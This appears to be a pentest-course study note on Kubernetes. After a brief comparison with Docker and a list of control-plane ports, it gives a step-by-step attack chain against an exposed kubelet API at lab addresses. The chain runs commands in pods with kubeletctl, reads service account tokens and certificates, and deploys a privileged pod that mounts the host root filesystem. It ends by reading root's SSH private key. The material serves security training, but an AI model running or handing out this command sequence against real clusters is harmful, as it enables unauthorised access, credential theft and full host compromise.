Functions by running all applications in containers isolated from the host system through multiple layers of protection.

Comprised of
- Master node / the control plane: responsible for controlling the Kubernetes cluster 
- Worker nodes / minions: where the containerized applications are run

Differences between K8 and Docker

Docker: platform for containerizing apps
K8: an orchestration tool for managing containers

Docker: manual scaling with docker swarm
K8: automatic scaling

Docker: single network
K8: complex network with policies

Docker: volumes
K8: wide range of storage options


## Control Plane
etcd / TCP 2379,2380
API server / TCP 6443
Scheduler / TCP 10251
Controller Manager / TCP 10252
Kubelet API / TCP 10250
Read-Only Kubelet API / TCP 10255

GET
POST
PUT
PATCH
DELETE

**K8's API Server Interaction
```shell-session
curl https://10.129.10.11:6443 -k
curl https://10.129.10.11:10250/pods -k | jq .
```

**Kubeletctl - Extracting Pods
```shell-session
kubeletctl -i --server 10.129.10.11 pods
```

**Kubelet API - Available Commands
```shell-session
kubeletctl -i --server 10.129.10.11 scan rce
```

**Kubelet API - Executing Commands
```shell-session
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

**Privilege Escalation
```shell-session
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

**Kubelet API - Extracting Tokens
```shell-session
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

**Kubelet API - Extracting Certificates
```shell-session
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

**List Privileges
```shell-session
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
- If we have get create list as a privilege, then we can create a pod YAML, mount root filesystem

Pod YAML
```shell-session
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

**Creating a new pod
```shell-session
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

**Extracting Root's SSH Key
```shell-session
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
